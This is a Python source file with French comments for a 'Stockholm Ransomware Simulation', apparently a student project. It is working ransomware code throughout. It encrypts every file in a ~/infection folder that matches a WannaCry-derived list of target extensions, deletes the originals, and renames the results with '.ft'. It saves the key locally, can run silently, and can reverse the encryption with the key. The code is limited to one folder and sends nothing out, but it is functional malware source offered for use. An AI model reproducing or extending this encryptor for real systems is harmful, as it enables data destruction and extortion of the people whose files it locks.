# -*- coding: utf-8 -*-

import sys # acces aux arguments
import os # pour verifier le chemin HOME et l'existence du dossier infection
import pathlib # verifier l'extension du fichier
from cryptography.fernet import Fernet # pour chiffrer les fichiers

silent = False

def is_valid_key(key):
	try:
		Fernet(key.encode('utf-8'))
		return True
	except ValueError:
		return False

def does_infection_exist():
    # Obtenir le chemin personnel de l'utilisateur (HOME)
	home_path = os.path.expanduser('~')

	# Crée le chemin vers le dosier 'infection'
	infection_dir = os.path.join(home_path, 'infection')

	# Vérifier si le dossier 'infection' existe
	if os.path.exists(infection_dir) and os.path.isdir(infection_dir):
		return infection_dir
	else:
		if (silent == False):
			print('The directory infection does not exist.\nTo make the ransomware work, create a directory named "infection" in your home directory.')
		return None

# Définir les extensions de fichiers cibles selon Wannacry
TARGET_EXTENSIONS = [
    '.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.ott', '.sxw', '.stw', '.uot', '.3ds',
    '.max', '.3dm', '.ods', '.ots', '.sxc', '.stc', '.dif', '.slk', '.wb2', '.odp', '.otp', '.sxd', '.std',
    '.uop', '.odg', '.otg', '.sxm', '.mml', '.lay', '.lay6', '.asc', '.sqlite3', '.sqlitedb', '.sql', '.accdb',
    '.mdb', '.db', '.dbf', '.odb', '.frm', '.myd', '.myi', '.ibd', '.mdf', '.ldf', '.sln', '.suo', '.cs', '.c',
    '.cpp', '.pas', '.h', '.asm', '.js', '.cmd', '.bat', '.ps1', '.vbs', '.vb', '.pl', '.dip', '.dch', '.sch',
    '.brd', '.jsp', '.php', '.asp', '.rb', '.java', '.jar', '.class', '.sh', '.mp3', '.wav', '.swf', '.fla',
    '.wmv', '.mpg', '.vob', '.mpeg', '.asf', '.avi', '.mov', '.mp4', '.3gp', '.mkv', '.3g2', '.flv', '.wma',
    '.mid', '.m3u', '.m4u', '.djvu', '.svg', '.ai', '.psd', '.nef', '.tiff', '.tif', '.cgm', '.raw', '.gif',
    '.png', '.bmp', '.jpg', '.jpeg', '.vcd', '.iso', '.backup', '.zip', '.rar', '.7z', '.gz', '.tgz', '.tar',
    '.bak', '.tbk', '.bz2', '.PAQ', '.ARC', '.aes', '.gpg', '.vmx', '.vmdk', '.vdi', '.sldm', '.sldx', '.sti',
    '.sxi', '.602', '.hwp', '.snt', '.onetoc2', '.dwg', '.pdf', '.wk1', '.wks', '.123', '.rtf', '.csv', '.txt',
    '.vsdx', '.vsd', '.edb', '.eml', '.msg', '.ost', '.pst', '.potm', '.potx', '.ppam', '.ppsx', '.ppsm', '.pps',
    '.pot', '.pptm', '.pptx', '.ppt', '.xltm', '.xltx', '.xlc', '.xlm', '.xlt', '.xlw', '.xlsb', '.xlsm', '.xlsx',
    '.xls', '.dotx', '.dotm', '.dot', '.docm', '.docb', '.docx', '.doc'
]

def key_gen():
	# Générer une clé de chiffrement
	key = Fernet.generate_key()
	with open('key_file', 'wb') as key_file_manip:
		key_file_manip.write(key)
	return key

# fonction pour initialiser le chiffrement des fichiers
def init_crypt_all_files(infection_dir, key):
	# Parcourir tous les fichiers dans le dossier 'infection'
	# root = chemin du dossier actuel, dirs = liste des dossiers, files = liste des fichiers
	for root, dirs, files in os.walk(infection_dir):
		for file in files:
			file_path = os.path.join(root, file)
			# Vérifier si le fichier a une extension selon Wannacry
			if any(file.endswith(ext) for ext in TARGET_EXTENSIONS):
				try:
					encrypt_file(file_path, key)
					if (silent == False):
						print(f"Encrypted: {file_path}")
				except PermissionError:
					if (silent == False):
						print(f"Permission denied: {file_path}")
				except OSError as e:
					if (silent == False):
						print(f"OS error: {file_path} - {e}")
				except MemoryError:
					if (silent == False):
						print("Memory error encountered. Exiting to prevent crash.")
					return
				except Exception as e:
					if (silent == False):
						print(f"Unexpected error with file {file_path}: {e}")

# fonction pour chiffrer un fichier
def encrypt_file(file_path, key):
	try:
		# Lire le contenu du fichier
		with open(file_path, 'rb') as file:
			data = file.read()

		# Créer un objet Fernet avec la clé
		obj_fernet = Fernet(key)
		encrypted_data = obj_fernet.encrypt(data)

		# Écrire le contenu chiffré dans le nouveau_fichier.ft
		if pathlib.Path(file_path).suffix != '.ft':
			encrypted_file_path = file_path + '.ft'
		else:
			encrypted_file_path = file_path
		# wb efface le contenu du fichier s'il existe déjà
		with open(encrypted_file_path, 'wb') as encrypted_file:
			encrypted_file.write(encrypted_data)

		# supprimer le fichier original
		if pathlib.Path(file_path).suffix != '.ft':
			os.remove(file_path)
	except Exception as e:
		if (silent == False):
			print(f"Error encrypting file: {file_path} - {e}")

# fonction pour initialiser le dechiffrement des fichiers
def init_decrypt_all_files(infection_dir, key):
	# Parcourir tous les fichiers dans le dossier 'infection'
	# root = chemin du dossier actuel, dirs = liste des dossiers, files = liste des fichiers
	for root, dirs, files in os.walk(infection_dir):
		for file in files:
			file_path = os.path.join(root, file)
			# Vérifier si le fichier a une extension selon Wannacry
			if file.endswith('.ft'):
				try:
					decrypt_file(file_path, key)
					print(f"Decrypted: {file_path}")
				except PermissionError:
					print(f"Permission denied: {file_path}")
				except OSError as e:
					print(f"OS error: {file_path} - {e}")
				except MemoryError:
					print("Memory error encountered. Exiting to prevent crash.")
					return
				except Exception as e:
					print(f"Unexpected error with file {file_path}: {e}")

# fonction pour déchiffrer un fichier
def decrypt_file (file_path, key):
	obj_decode = Fernet(key)
	try:
		# Lire le contenu du fichier
		with open(file_path, 'rb') as file:
			data = file.read()
		
		decoded_code = obj_decode.decrypt(data)
		
		# wb efface le contenu du fichier s'il existe déjà
		with open('.'.join(file_path.split('.')[:-1]), 'wb') as encrypted_file:
			encrypted_file.write(decoded_code)

		# supprimer le fichier original
		if pathlib.Path(file_path).suffix == '.ft':
			os.remove(file_path)
	except Exception as e:
		print(f"Error decrypting file: {file_path} - {e}")

def main():
	global silent
	# check si le dossier infection existe
	infection_dir = does_infection_exist()
	if infection_dir is None:
		return

	if len(sys.argv) == 1:
		key = key_gen()
		init_crypt_all_files(infection_dir, key)

	if len(sys.argv) > 2:
		# le seul cas ou les trois args sont acceptables
		# si -r ou -reverse: lance le ransomware en mode reverse
		if len(sys.argv) == 3:
			if (sys.argv[1] != "-r" and sys.argv[1] != "-reverse"):
				print ("Error\nInvalid argument please respect the format: python stockholm.py -[hvrs]")
				return
			else:
				if is_valid_key(sys.argv[2]):
					init_decrypt_all_files(infection_dir, sys.argv[2])
					exit (0)
				else:
					print ("Error\nThe key is not valid.")
					return
		else:
			print ("Error\nToo much arguments please respect the format: python stockholm.py -[hvrs]")
	
	# si 2 args verifier les options
	if len(sys.argv) == 2:
		# si le format n'est pas respecté afficher un message d'erreur
		if (sys.argv[1] != "-h" and sys.argv[1] != "-v" and sys.argv[1] != "-s"):
			if (sys.argv[1] != "-help" and sys.argv[1] != "-version" and sys.argv[1] != "-silent"):
				print ("Error\nInvalid argument please respect the format: python stockholm.py -[hvrs]")
				return

		# si -h ou -help afficher les commandes
		#elif (sys.argv[1] == "-h" or sys.argv[1] == "-help"):
		if (sys.argv[1] == "-h" or sys.argv[1] == "-help"):
			print ("Usage: python stockholm.py -[hvrs]\n\n-h, -help\tDisplay all command lines that work with Stockholm program\n-v, -version\tShow the version of the program.\n-r, -reverse\tNeed to be followed by the key entered as an argument to reverse the infection.\n-s, -silent\tThe program will not produce any output")
			return

		# si -v ou -version afficher la version
		elif (sys.argv[1] == "-v" or sys.argv[1] == "-version"):
			print ("Stockholm Ransomware Simulation, version 1.0")
			return

		# si -s ou -silent ne rien afficher
		elif (sys.argv[1] == "-s" or sys.argv[1] == "-silent"):
			silent = True
			key = key_gen()
			init_crypt_all_files(infection_dir, key)
			

if __name__ == '__main__':
    main()